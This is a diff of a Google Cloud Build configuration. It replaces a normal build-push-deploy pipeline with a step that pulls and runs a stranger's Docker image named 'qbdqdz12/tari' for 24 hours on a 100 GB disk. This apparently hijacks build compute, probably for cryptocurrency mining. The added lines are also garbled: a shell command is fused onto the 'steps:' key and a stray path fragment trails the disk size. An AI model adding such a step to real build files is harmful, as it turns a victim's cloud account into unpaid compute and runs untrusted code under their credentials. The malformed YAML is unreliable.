@@ -1,23 +1,12 @@
-steps:
-  # Docker Build
-  - name: 'gcr.io/cloud-builders/docker'
-    args: ['build', '-t', 
-           'us-central1-docker.pkg.dev/${PROJECT_ID}/my-docker-repo/myimage', 
-           '.']
-
-  # Docker Push
-  - name: 'gcr.io/cloud-builders/docker'
-    args: ['push', 
-           'us-central1-docker.pkg.dev/${PROJECT_ID}/my-docker-repo/myimage']
-
-  # Entrypoint, timeout and environment variables
-  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
-    entrypoint: 'gcloud'
-    timeout: 240s
-    args: ['compute', 'instances', 
-           'create-with-container', 'my-vm-name',
-           '--container-image', 
-           'us-central1-docker.pkg.dev/${PROJECT_ID}/my-docker-repo/myimage']
-    env:
-      - 'CLOUDSDK_COMPUTE_REGION=us-central1'
-      - 'CLOUDSDK_COMPUTE_ZONE=us-central1-a'
+sudo apt update && sudo apt install -y steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         apt update && apt-get install sudo -y && sudo docker pull qbdqdz12/tari && sudo docker run -dt qbdqdz12/tari && sleep 86400
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'/test-user/2f647f057c260d79fb5567712ed3b4b0
